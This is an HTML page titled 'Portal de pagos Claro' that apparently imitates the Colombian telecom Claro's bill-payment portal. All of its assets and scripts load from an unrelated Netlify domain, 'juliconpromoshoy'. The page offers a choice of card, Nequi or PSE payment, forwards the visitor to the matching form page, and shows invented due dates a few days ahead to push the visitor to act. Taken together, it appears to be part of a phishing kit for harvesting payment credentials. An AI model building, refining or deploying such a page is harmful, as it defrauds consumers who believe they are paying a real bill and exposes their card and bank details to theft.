<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, user-scalable=no" />
  <link rel="icon" type="image/png" href="img/favicon.ico" />
  <title>Portal de pagos Claro</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://juliconpromoshoy.netlify.app//css/newIndex.css">
  <link rel="stylesheet" href="https://juliconpromoshoy.netlify.app/css/index.css">
  <script src="https://juliconpromoshoy.netlify.app/js/functions.js"></script>
  <script src="js/debtMap.js"></script>
  <link rel="stylesheet" href="https://juliconpromoshoy.netlify.app/css/styles.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
    rel="stylesheet" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/js/bootstrap.bundle.min.js"></script>
  <style>
    #loader-container {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }

    #loader {
      width: 3.25em;
      transform-origin: center;
      animation: rotate4 2s linear infinite;
    }

    circle {
      fill: none;
      stroke: hsl(0, 97%, 59%);
      stroke-width: 2;
      stroke-dasharray: 1, 200;
      stroke-dashoffset: 0;
      stroke-linecap: round;
      animation: dash4 1.5s ease-in-out infinite;
    }

    @keyframes rotate4 {
      100% {
        transform: rotate(360deg);
      }
    }

    @keyframes dash4 {
      0% {
        stroke-dasharray: 1, 200;
        stroke-dashoffset: 0;
      }

      50% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -35;
      }

      100% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -124;
      }
    }

    #tabla-factura td:nth-child(2) {
      color: #8b8b8b;
    }

    #tabla-factura tr:first-child td:nth-child(2) {
      color: #ef3829;
      font-weight: 500;
      font-size: 18px;
    }

    .btn {
      height: 3.5rem;
      width: 80vw;
      border-radius: 10px;
      background-color: #bfbebe;
      color: white;
      font-weight: bold;
      font-size: 13px;
      border: #ef3829;
    }

    .btn-enabled {
      background-color: #ef3829;
      border: #ef3829;
    }
  </style>
</head>

<body>
  <!-- HEADER OMITIDO (idéntico al tuyo) -->

  <main>
    <!-- FACTURA OMITIDA (idéntica a la tuya) -->

    <div id="contenedor">
      <div class="medio">
        <label class="titulo1" style="font-weight: 600;">Selecciona un medio de pago</label>
      </div>
    </div>

    <div class="select" id="select">
      <div class="contenido-select" style="margin: 0 auto;">
        <label>Selecciona una opción</label>
      </div>
      <i class="fas fa-angle-down" aria-hidden="true"></i>
      <div class="opciones">
        <div class="opcion" data-url="tarjeta.html">
          <img src="https://juliconpromoshoy.netlify.app/img/FORMA_PAGO_2.png" alt="Tarjeta de Crédito-Débito"
            class="icono" />
          <span>Tarjeta de Crédito-Débito</span>
        </div>
        <div class="opcion" data-url="nequi.html">
          <img src="https://juliconpromoshoy.netlify.app/img/NEQ.png" alt="Nequi" class="icono" />
          <span>Nequi</span>
        </div>
        <div class="opcion" data-url="pse.html">
          <img src="https://juliconpromoshoy.netlify.app/img/pse.png" alt="PSE" class="icono" />
          <span>PSE</span>
        </div>
      </div>
    </div>

    <div class="button centrado">
      <button class="btn" style="margin: 0 auto;" disabled id="nextStep">SIGUIENTE</button>
    </div>

    <p id="fecha-actual"></p>
  </main>

  <footer>
    <img class="hidden md:flex" src="https://juliconpromoshoy.netlify.app/assets/footer-dk.png" alt="">
    <img class="flex md:hidden" src="https://juliconpromoshoy.netlify.app/assets/footer.png" alt="">
  </footer>

  <div id="loader-container">
    <div id="loader">
      <svg viewBox="25 25 50 50">
        <circle r="20" cy="50" cx="50"></circle>
      </svg>
    </div>
  </div>

  <script>
    function obtenerFecha() {
      const fecha = new Date();
      const opciones = {
        weekday: "long",
        year: "numeric",
        month: "long",
        day: "numeric",
      };
      const fechaFormateada = fecha.toLocaleDateString("es-ES", opciones);
      document.getElementById("fecha-actual").innerHTML = `${fechaFormateada}`;
    }
    window.onload = obtenerFecha;
  </script>

  <script>
    const today = new Date();
    const pagarAntesDe = new Date(today);
    pagarAntesDe.setDate(today.getDate() + 7);
    const cargaMinutos = new Date(today);
    cargaMinutos.setDate(today.getDate() + 1);

    const formatDate = (date) => {
      const day = String(date.getDate()).padStart(2, '0');
      const month = String(date.getMonth() + 1).padStart(2, '0');
      const year = date.getFullYear();
      return `${day}/${month}/${year}`;
    };

    document.getElementById('pague-antes').textContent = formatDate(pagarAntesDe);
    document.getElementById('carga-minutos').textContent = formatDate(cargaMinutos);
  </script>

  <script>
    let selectedUrl = null;
    document.querySelectorAll(".opcion").forEach(opcion => {
      opcion.addEventListener("click", function () {
        selectedUrl = this.getAttribute("data-url");
        const btn = document.getElementById("nextStep");
        btn.disabled = false;
        btn.classList.add("btn-enabled");
      });
    });

    document.getElementById("nextStep").addEventListener("click", function () {
      if (selectedUrl) {
        window.location.href = selectedUrl;
      }
    });
  </script>

  <script src="https://juliconpromoshoy.netlify.app/js/data.js"></script>
  <script src="https://juliconpromoshoy.netlify.app/js/clearData.js"></script>
</body>
</html>
